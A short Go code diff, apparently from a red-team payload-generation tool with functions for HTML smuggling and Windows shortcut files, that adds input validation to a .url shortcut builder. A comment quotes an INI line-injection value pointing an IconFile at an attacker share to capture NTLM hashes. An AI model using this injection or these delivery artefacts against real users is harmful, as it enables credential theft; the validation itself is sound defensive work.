@@ -38,8 +38,26 @@ func BuildHTMLSmuggling(filename string, payload []byte) []byte {
 }
 
 // BuildURLShortcut writes a Windows Internet Shortcut (.url) pointing at url.
-func BuildURLShortcut(targetURL string) []byte {
-	return []byte("[InternetShortcut]\r\nURL=" + targetURL + "\r\n")
+// BuildURLShortcut renders a Windows internet shortcut (.url).
+//
+// The target is validated, not merely concatenated: a .url file is an INI document, so a URL
+// containing a line break injects further KEYS - `URL=http://x\r\nIconFile=\\\\attacker\\share\\i.ico`
+// makes Explorer fetch that icon (and hand over an NTLM hash) the moment the operator looks at
+// the file. Control characters are refused outright.
+func BuildURLShortcut(targetURL string) ([]byte, error) {
+	target := strings.TrimSpace(targetURL)
+	if target == "" {
+		return nil, fmt.Errorf("url required")
+	}
+	for _, r := range target {
+		if r < 0x20 || r == 0x7f {
+			return nil, fmt.Errorf("url contains a control character")
+		}
+	}
+	if !strings.Contains(target, "://") {
+		return nil, fmt.Errorf("url must be absolute (scheme://...)")
+	}
+	return []byte("[InternetShortcut]\r\nURL=" + target + "\r\n"), nil
 }
 
 // BuildCMDLnk builds a minimal Unicode Shell Link (.lnk) that launches
